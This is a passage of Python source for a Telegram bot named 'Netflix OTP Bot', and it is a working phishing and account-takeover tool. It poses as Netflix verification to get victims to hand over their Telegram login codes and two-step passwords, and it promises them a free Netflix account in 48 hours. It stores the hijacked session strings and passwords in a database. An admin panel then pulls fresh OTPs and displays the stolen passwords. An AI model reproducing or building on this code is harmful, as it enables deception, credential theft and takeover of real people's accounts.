    def _handle_more_accounts(self, call: CallbackQuery):
        """Show more accounts (pagination)"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            return
        
        # This would implement pagination
        # For now, just show view accounts again
        self._handle_view_accounts(call)
    
    def _handle_account_selection(self, call: CallbackQuery):
        """Show account details"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            return
        
        account_id = call.data.replace("account_", "")
        
        try:
            account = self.accounts_col.find_one({"_id": ObjectId(account_id)})
            if not account:
                self.bot.answer_callback_query(call.id, "Account not found", show_alert=True)
                self._handle_view_accounts(call)
                return
            
            # Format account details
            phone_display = self._format_phone(account["phone"])
            has_2fa = "✅ Enabled" if account.get("has_2fa") else "❌ Disabled"
            status = account.get("status", "active")
            status_icon = "✅" if status == "active" else "⚠️"
            
            created = account.get("created_at", datetime.utcnow())
            updated = account.get("updated_at", datetime.utcnow())
            
            account_text = f"""
<b>📱 Account Details</b>

<b>Phone:</b> <code>{phone_display}</code>
<b>Status:</b> {status_icon} {status.title()}
<b>2FA:</b> {has_2fa}
<b>Added:</b> {created.strftime('%d %b %Y %H:%M')}
<b>Updated:</b> {updated.strftime('%d %b %Y %H:%M')}

<b>Actions:</b>
"""
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
            
            # Add validate session button
            markup.add(InlineKeyboardButton("🔍 Validate Session", callback_data=f"validate_{account_id}"))
            
            markup.add(InlineKeyboardButton("⬅️ Back", callback_data="view_accounts"))
            
            self._smart_send_message(
                call.message.chat.id,
                user_id,
                "account_details",
                account_text,
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Account selection error: {e}")
            self.bot.answer_callback_query(call.id, "Error loading account", show_alert=True)
    
    def _handle_get_otp(self, call: CallbackQuery):
        """Fetch OTP for account"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            return
        
        account_id = call.data.replace("get_otp_", "")
        
        try:
            account = self.accounts_col.find_one({"_id": ObjectId(account_id)})
            if not account:
                self.bot.answer_callback_query(call.id, "Account not found", show_alert=True)
                return
            
            # Show fetching message
            self.bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
            
            # Fetch OTP
            otp = self.account_manager.get_latest_otp(
                account["session_string"],
                account["phone"],
                max_messages=100
            )
            
            phone_display = self._format_phone(account["phone"])
            
            if not otp:
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🔄 Try Again", callback_data=f"get_otp_{account_id}"))
                markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
                
                self._smart_send_message(
                    call.message.chat.id,
                    user_id,
                    "otp_result",
                    f"<b>📱 No OTP Found</b>\n\n"
                    f"Phone: <code>{phone_display}</code>\n\n"
                    f"No OTP found in recent messages.",
                    markup=markup,
                    photo_url=NETFLIX_MAIN_IMAGE
                )
                return
            
            # Save OTP log
            self._save_otp_log(account["phone"], otp, user_id)
            
            # Prepare message
            message = f"<b>📱 OTP Details</b>\n\n"
            message += f"<b>Phone:</b> <code>{phone_display}</code>\n"
            message += f"<b>OTP:</b> <code>{otp}</code>\n"
            
            if account.get("has_2fa") and account.get("two_step_password"):
                message += f"<b>2FA Password:</b> <code>{account['two_step_password']}</code>\n"
            
            message += f"<b>Fetched:</b> {datetime.utcnow().strftime('%H:%M:%S')}\n"
            
            # Create buttons
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Fetch Again", callback_data=f"get_otp_{account_id}"))
            markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
            
            self._smart_send_message(
                call.message.chat.id,
                user_id,
                "otp_result",
                message,
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            
            self._track_action(user_id, "fetch_otp", {"phone": account["phone"], "otp": otp})
            
        except Exception as e:
            logger.error(f"Get OTP error: {e}")
            self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}", show_alert=True)
    
    def _handle_otp_logs(self, call: CallbackQuery):
        """Show OTP logs"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            return
        
        # Get recent OTP logs
        logs = list(self.otp_logs_col.find(
            {},
            {"phone": 1, "otp": 1, "fetched_at": 1, "fetched_by": 1}
        ).sort("fetched_at", DESCENDING).limit(20))
        
        if not logs:
            logs_text = "<b>📊 OTP Logs</b>\n\nNo OTP logs found yet."
        else:
            logs_text = "<b>📊 Recent OTP Logs</b>\n\n"
            for idx, log in enumerate(logs, 1):
                phone = self._format_phone(log.get("phone", "N/A"))
                otp = log.get("otp", "N/A")
                time_str = log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
                logs_text += f"{idx}. {phone}: <code>{otp}</code> ({time_str})\n"
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
        
        self._smart_send_message(
            call.message.chat.id,
            user_id,
            "otp_logs",
            logs_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    # ========================
    # PHONE/OTP/2FA HANDLERS
    # ========================
    
    def _handle_phone_input(self, message: Message):
        """Handle phone number input"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        state = self.session_manager.get_login_state(user_id)
        if not state:
            if self._is_admin(user_id):
                self._show_admin_dashboard(user_id, chat_id)
            else:
                self._show_netflix_welcome(user_id, chat_id)
            return
        
        phone = message.text.strip()
        
        # Validate phone
        is_valid, error_or_phone = self._validate_phone(phone)
        if not is_valid:
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                photo = NETFLIX_MAIN_IMAGE
                error_title = "Invalid Format"
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                photo = NETFLIX_WELCOME_IMAGE
                error_title = "Invalid Phone Number"
            
            error_text = f"""
<b>❌ {error_title}</b>

{error_or_phone}

<b>Please enter valid phone number:</b>
<b>Example:</b> +919876543210

Enter phone number again:
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                markup=markup,
                photo_url=photo
            )
            return
        
        phone = error_or_phone  # Validated phone
        
        # Show sending message
        if state.get("user_type") == "admin":
            sending_text = """
<b>⏳ Sending OTP...</b>

<i>Please wait while we send verification code to the phone number.</i>
<i>This may take 10-30 seconds.</i>
"""
            photo = NETFLIX_MAIN_IMAGE
        else:
            sending_text = """
<b>⏳ Netflix Verification</b>

<code>Netflix is sending verification code to your phone number...</code>

<i>This may take 10-30 seconds.</i>
<i>Please wait patiently.</i>
"""
            photo = NETFLIX_WELCOME_IMAGE
        
        self._smart_send_message(
            chat_id,
            user_id,
            "login",
            sending_text,
            photo_url=photo
        )
        
        # Track action
        self._track_action(user_id, "phone_entered", {"phone": phone}, phone)
        
        try:
            # Send OTP
            result = self.account_manager.send_otp(
                phone,
                device_type="android",  # Can be configured
                ip_address="user_ip"  # Should get real IP in production
            )
            
            if not result.get("success"):
                error_msg = result.get("error", "Unknown error")
                
                if state.get("user_type") == "admin":
                    markup = InlineKeyboardMarkup().add(
                        InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                    )
                    error_photo = NETFLIX_MAIN_IMAGE
                    error_title = "Failed to send OTP"
                else:
                    markup = InlineKeyboardMarkup().add(
                        InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                    )
                    error_photo = NETFLIX_WELCOME_IMAGE
                    error_title = "Netflix Verification Failed"
                
                error_text = f"""
<b>❌ {error_title}</b>

{error_msg}

<b>Please try again:</b>
Enter phone number:
"""
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "login",
                    error_text,
                    markup=markup,
                    photo_url=error_photo
                )
                return
            
            # Update state
            self.session_manager.set_login_state(user_id, {
                "step": "ask_otp",
                "phone": phone,
                "phone_code_hash": result["phone_code_hash"],
                "session_key": result["session_key"],
                "user_type": state.get("user_type", "netflix"),
                "device_info": result.get("device_info", {})
            })
            
            # Show OTP input
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                otp_photo = NETFLIX_MAIN_IMAGE
                otp_text = f"""
<b>✅ OTP Sent Successfully</b>

<b>Phone:</b> <code>{phone}</code>
<b>Device:</b> {result.get('device_info', {}).get('device_model', 'Unknown')}

<b>Enter the 5-digit OTP code received on Telegram:</b>
<i>Check your Telegram messages from "Telegram" or "777000"</i>
"""
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                otp_photo = NETFLIX_WELCOME_IMAGE
                otp_text = f"""
<b>📩 Netflix Verification Code Sent</b>

<code>Netflix sent you a message on your Telegram with 5 digit code for Netflix verification.</code>

<b>Phone:</b> <code>{phone}</code>

<b>Enter the 5-digit verification code:</b>
<i>Check your Telegram messages from "Telegram"</i>
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                otp_text,
                markup=markup,
                photo_url=otp_photo
            )
            
        except Exception as e:
            logger.error(f"Send OTP error: {e}")
            
            error_text = f"""
<b>❌ Connection Error</b>

Failed to send verification code.

<b>Error:</b> {str(e)[:100]}

Start again with /start
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            
            # Clear state
            self.session_manager.clear_login_state(user_id)
    
    def _handle_otp_input(self, message: Message):
        """Handle OTP input"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        state = self.session_manager.get_login_state(user_id)
        if not state:
            if self._is_admin(user_id):
                self._show_admin_dashboard(user_id, chat_id)
            else:
                self._show_netflix_welcome(user_id, chat_id)
            return
        
        otp_code = message.text.strip()
        
        # Validate OTP format
        if not otp_code.isdigit() or len(otp_code) not in [5, 6]:
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                error_photo = NETFLIX_MAIN_IMAGE
                error_text = """
<b>❌ Invalid Code Format</b>

OTP must be 5 or 6 digits.

<b>Enter OTP code again:</b>
"""
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                error_photo = NETFLIX_WELCOME_IMAGE
                error_text = """
<b>❌ Invalid Verification Code</b>

Netflix verification code must be 5 or 6 digits.

<b>Enter the code again:</b>
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                markup=markup,
                photo_url=error_photo
            )
            return
        
        # Show verifying message
        if state.get("user_type") == "admin":
            verify_text = """
<b>⏳ Verifying OTP...</b>

<i>Please wait while we verify the code.</i>
<i>This may take a few seconds.</i>
"""
            verify_photo = NETFLIX_MAIN_IMAGE
        else:
            verify_text = """
<b>⏳ Verifying Netflix Code...</b>

<code>Checking verification code with Netflix servers...</code>

<i>Please wait...</i>
"""
            verify_photo = NETFLIX_WELCOME_IMAGE
        
        self._smart_send_message(
            chat_id,
            user_id,
            "login",
            verify_text,
            photo_url=verify_photo
        )
        
        # Track action
        self._track_action(user_id, "otp_entered", {"phone": state["phone"]}, state["phone"])
        
        try:
            # Verify OTP
            result = self.account_manager.verify_otp(
                state["session_key"],
                otp_code,
                state["phone"],
                state["phone_code_hash"]
            )
            
            if result.get("needs_2fa"):
                # 2FA required
                self.session_manager.set_login_state(user_id, {
                    **state,
                    "step": "ask_2fa"
                })
                
                if state.get("user_type") == "admin":
                    markup = InlineKeyboardMarkup().add(
                        InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                    )
                    photo = NETFLIX_MAIN_IMAGE
                    text = """
<b>🔐 Two-Step Verification Required</b>

This account has two-step verification enabled.

<b>Enter your 2-step verification password:</b>
"""
                else:
                    markup = InlineKeyboardMarkup().add(
                        InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                    )
                    photo = NETFLIX_WELCOME_IMAGE
                    text = """
<b>🔒 Netflix Two-Step Verification</b>

<code>This Netflix account has extra security enabled.</code>

<b>Enter your Netflix account password:</b>
"""
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "login",
                    text,
                    markup=markup,
                    photo_url=photo
                )
                return
            
            if not result.get("success"):
                error_msg = result.get("error", "Unknown error")
                
                if state.get("user_type") == "admin":
                    error_text = f"""
<b>❌ OTP Verification Failed</b>

{error_msg}

Start again with /start
"""
                    error_photo = NETFLIX_MAIN_IMAGE
                else:
                    error_text = f"""
<b>❌ Netflix Verification Failed</b>

<code>Could not verify with Netflix servers.</code>

<b>Error:</b> {error_msg}

Start again with /start
"""
                    error_photo = NETFLIX_WELCOME_IMAGE
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "login",
                    error_text,
                    photo_url=error_photo
                )
                
                # Clear state
                self.session_manager.clear_login_state(user_id)
                return
            
            # Save account to database
            user_type = state.get("user_type", "netflix")
            added_by = user_id if user_type == "admin" else None
            
            saved = self._save_account(
                state["phone"],
                result["session_string"],
                result["has_2fa"],
                result.get("two_step_password"),
                added_by
            )
            
            # Show success message
            if user_type == "admin":
                success_text = f"""
<b>✅ Account Added Successfully!</b>

<b>📱 Phone:</b> <code>{self._format_phone(state['phone'])}</code>
<b>📱 Device:</b> {result.get('device_info', {}).get('device_model', 'Unknown')}
<b>🔐 2FA:</b> {'✅ Enabled' if result['has_2fa'] else '❌ Disabled'}
<b>👤 User ID:</b> {result.get('account_info', {}).get('user_id', 'N/A')}

<b>Account has been added to database and is now available for OTP fetching.</b>
"""
                success_photo = NETFLIX_MAIN_IMAGE
                
                # Clear state and show dashboard
                self.session_manager.clear_login_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
                
                # Track successful admin login
                self._track_action(user_id, "admin_login_success", {
                    "phone": state["phone"],
                    "has_2fa": result["has_2fa"]
                }, state["phone"])
                
            else:
                success_text = f"""
<b>🎉 Netflix Request Submitted Successfully!</b>

<code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>

<b>📱 Your Number:</b> <code>{self._format_phone(state['phone'])}</code>
<b>⏳ Status:</b> Under Review
<b>📅 Estimated:</b> 48 Hours
<b>✅ Verification:</b> Completed

<i>You will receive Netflix account details on this number once approved.</i>

<b>Thank you for choosing Netflix! 🎬</b>
"""
                success_photo = NETFLIX_WELCOME_IMAGE
                
                # Clear state
                self.session_manager.clear_login_state(user_id)
                
                # Show success message
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "success",
                    success_text,
                    markup=markup,
                    photo_url=success_photo
                )
                
                # Track successful user login
                self._track_action(user_id, "user_login_success", {
                    "phone": state["phone"]
                }, state["phone"])
            
        except Exception as e:
            logger.error(f"Verify OTP error: {e}")
            
            error_text = f"""
<b>❌ Verification Error</b>

Failed to verify code.

<b>Error:</b> {str(e)[:100]}

Start again with /start
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            
            # Clear state
            self.session_manager.clear_login_state(user_id)
    
    def _handle_2fa_input(self, message: Message):
        """Handle 2FA password input"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        state = self.session_manager.get_login_state(user_id)
        if not state:
            if self._is_admin(user_id):
                self._show_admin_dashboard(user_id, chat_id)
            else:
                self._show_netflix_welcome(user_id, chat_id)
            return
        
        password = message.text.strip()
        
        if not password:
            if state.get("user_type") == "admin":
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin")
                )
                error_photo = NETFLIX_MAIN_IMAGE
                error_text = """
<b>❌ Password Required</b>

Password cannot be empty.

<b>Enter 2-step verification password again:</b>
"""
            else:
                markup = InlineKeyboardMarkup().add(
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
                )
                error_photo = NETFLIX_WELCOME_IMAGE
                error_text = """
<b>❌ Password Required</b>

Netflix account password cannot be empty.

<b>Enter password again:</b>
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                markup=markup,
                photo_url=error_photo
            )
            return
        
        # Show verifying message
        if state.get("user_type") == "admin":
            verify_text = """
<b>⏳ Verifying Password...</b>

<i>Checking 2-step verification password...</i>
"""
            verify_photo = NETFLIX_MAIN_IMAGE
        else:
            verify_text = """
<b>⏳ Verifying Netflix Password...</b>

<code>Checking password with Netflix security...</code>
"""
            verify_photo = NETFLIX_WELCOME_IMAGE
        
        self._smart_send_message(
            chat_id,
            user_id,
            "login",
            verify_text,
            photo_url=verify_photo
        )
        
        # Track action
        self._track_action(user_id, "2fa_entered", {"phone": state["phone"]}, state["phone"])
        
        try:
            # Verify 2FA
            result = self.account_manager.verify_2fa(state["session_key"], password)
            
            if not result.get("success"):
                error_msg = result.get("error", "Unknown error")
                
                if state.get("user_type") == "admin":
                    error_text = f"""
<b>❌ Password Verification Failed</b>

{error_msg}

Start again with /start
"""
                    error_photo = NETFLIX_MAIN_IMAGE
                else:
                    error_text = f"""
<b>❌ Netflix Password Incorrect</b>

<code>Could not verify Netflix account password.</code>

<b>Error:</b> {error_msg}

Start again with /start
"""
                    error_photo = NETFLIX_WELCOME_IMAGE
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "login",
                    error_text,
                    photo_url=error_photo
                )
                
                # Clear state
                self.session_manager.clear_login_state(user_id)
                return
            
            # Save account to database
            user_type = state.get("user_type", "netflix")
            added_by = user_id if user_type == "admin" else None
            
            saved = self._save_account(
                state["phone"],
                result["session_string"],
                result["has_2fa"],
                result.get("two_step_password"),
                added_by
            )
            
            # Show success message
            if user_type == "admin":
                success_text = f"""
<b>✅ Account Added Successfully!</b>

<b>📱 Phone:</b> <code>{self._format_phone(state['phone'])}</code>
<b>🔐 2FA:</b> ✅ Enabled
<b>👤 User ID:</b> {result.get('account_info', {}).get('user_id', 'N/A')}

<b>Account with 2FA has been added to database.</b>
"""
                success_photo = NETFLIX_MAIN_IMAGE
                
                # Clear state and show dashboard
                self.session_manager.clear_login_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
                
                # Track successful admin 2FA login
                self._track_action(user_id, "admin_2fa_login_success", {
                    "phone": state["phone"]
                }, state["phone"])
                
            else:
                success_text = f"""
<b>🎉 Netflix Account Secured!</b>

<code>Your Netflix account with extra security has been registered successfully.</code>

<b>📱 Your Number:</b> <code>{self._format_phone(state['phone'])}</code>
<b>🔒 Security:</b> Two-Step Enabled
<b>⏳ Status:</b> Under Review
<b>📅 Estimated:</b> 48 Hours

<i>Netflix account will be delivered to your number within 48 hours.</i>

<b>Thank you for choosing Netflix! 🎬</b>
"""
                success_photo = NETFLIX_WELCOME_IMAGE
                
                # Clear state
                self.session_manager.clear_login_state(user_id)
                
                # Show success message
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
                
                self._smart_send_message(
                    chat_id,
                    user_id,
                    "success",
                    success_text,
                    markup=markup,
                    photo_url=success_photo
                )
                
                # Track successful user 2FA login
                self._track_action(user_id, "user_2fa_login_success", {
                    "phone": state["phone"]
                }, state["phone"])
            
        except Exception as e:
            logger.error(f"2FA verification error: {e}")
            
            error_text = f"""
<b>❌ Verification Error</b>

Failed to verify password.

<b>Error:</b> {str(e)[:100]}

Start again with /start
"""
            
            self._smart_send_message(
                chat_id,
                user_id,
                "login",
                error_text,
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            
            # Clear state
            self.session_manager.clear_login_state(user_id)
    
    # ========================
    # BOT CONTROL
    # ========================
    
    def run(self):
        """Run the bot"""
        logger.info("🎬 Starting Netflix OTP Bot...")
        logger.info(f"👑 Admin ID: {ADMIN_ID}")
        logger.info(f"📱 API ID: {API_ID}")
        logger.info(f"🖼️ Images: {NETFLIX_WELCOME_IMAGE}")
        
        try:
            self.bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
        except Exception as e:
            logger.error(f"Bot error: {e}")
        finally:
            self.shutdown()
    
    def shutdown(self):
        """Shutdown bot gracefully"""
        logger.info("Shutting down bot...")
        
        # Disconnect all account manager clients
        self.account_manager.disconnect_all()
        
        # Close database connection
        self.db_manager.close()
        
        logger.info("Bot shutdown complete")


# ========================
# MAIN ENTRY POINT
# ========================
if __name__ == "__main__":
    # Check for required environment variables
    required_vars = ["BOT_TOKEN", "ADMIN_ID", "API_ID", "API_HASH", "MONGO_URL"]
    missing_vars = [var for var in required_vars if not os.getenv(var)]
    
    if missing_vars:
        print("❌ Missing required environment variables:")
        for var in missing_vars:
            print(f"  • {var}")
        print("\nPlease set them before running the bot.")
        sys.exit(1)
    
    # Create and run bot
    try:
        bot = NetflixOTPBot()
        bot.run()
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        sys.exit(1)
